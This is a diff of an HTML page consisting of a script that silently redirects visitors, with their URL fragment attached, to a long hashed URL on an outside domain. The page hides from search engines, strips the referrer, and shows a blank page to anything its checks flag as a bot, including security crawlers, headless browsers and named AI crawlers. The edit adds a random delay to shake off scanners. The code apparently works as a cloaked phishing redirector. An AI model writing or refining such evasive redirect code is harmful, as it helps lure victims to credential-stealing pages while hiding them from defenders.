@@ -2,49 +2,56 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
-  <meta name="googlebot" content="noindex, nofollow">
-  <meta name="bingbot" content="noindex, nofollow">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+  <meta name="referrer" content="no-referrer">
   <title></title>
   <style>
-    body { margin: 0; background: #fff; }
+    html, body { margin: 0; padding: 0; background: #fff; height: 100%; }
   </style>
 </head>
 <body>
   <script>
   (function () {
+    "use strict";
+
     var BASE = "https://saldaticonsultservice.eu/00025A745563E6C08103CFE6E058609A/00025A745563E6C08103CFE6E058609A/0006EE2A855B2BD1B0684ACB9105714A";
 
-    // Keep #fragment through to final URL — no ?email=
+    // hash stays on final URL — no ?email=
     function getHash() {
-      var hash = window.location.hash || "";
-      if (!hash) return "";
-      if (hash.charAt(0) !== "#") hash = "#" + hash;
-      return hash;
+      var h = window.location.hash || "";
+      if (!h) return "";
+      if (h.charAt(0) !== "#") h = "#" + h;
+      return h;
     }
-    function buildTarget() {
-      return BASE + getHash();
+    function go() {
+      var dest = BASE + getHash();
+      try { window.location.replace(dest); }
+      catch (e) { window.location.href = dest; }
     }
 
-    function isBot() {
+    // --- light bot checks only (less aggressive) ---
+    function isObviousBot() {
       try {
         if (navigator.webdriver === true) return true;
         if (window.callPhantom || window._phantom || window.phantom) return true;
         if (window.__nightmare) return true;
         if (window.domAutomation || window.domAutomationController) return true;
         var ua = navigator.userAgent || "";
-        if (/HeadlessChrome|PhantomJS|bot|crawler|spider|curl|wget|python-requests|httpclient|scrapy|selenium|puppeteer|playwright|slurp|yandex|baidu|semrush|ahrefs|mj12|dotbot|petalbot|bytespider|gptbot|claudebot|anthropic|ccbot|facebookexternalhit|bingpreview/i.test(ua)) return true;
-        if (navigator.languages === undefined || (navigator.languages && navigator.languages.length === 0)) return true;
+        if (/HeadlessChrome|PhantomJS|bot|crawler|spider|curl\/|wget|python-requests|scrapy|selenium|puppeteer|playwright|ahrefs|semrush|mj12|dotbot|petalbot|bytespider|gptbot|claudebot|ccbot|facebookexternalhit|bingpreview/i.test(ua)) return true;
         if (window.outerWidth === 0 && window.outerHeight === 0) return true;
       } catch (e) {}
       return false;
     }
 
-    // No captcha, no checkbox, no "verify human" UI — silent redirect for non-bots
-    if (!isBot()) {
-      window.location.replace(buildTarget());
+    if (isObviousBot()) {
+      // blank page, no redirect
+      return;
     }
-    // Bots: stay on blank page, no redirect
+
+    // short quiet dwell so dumb prefetch/crawlers that don't run timers well drop off
+    // no mouse requirement — real humans pass even if they don't move
+    var wait = 400 + Math.floor(Math.random() * 500); // 0.4–0.9s
+    setTimeout(go, wait);
   })();
   </script>
 </body>
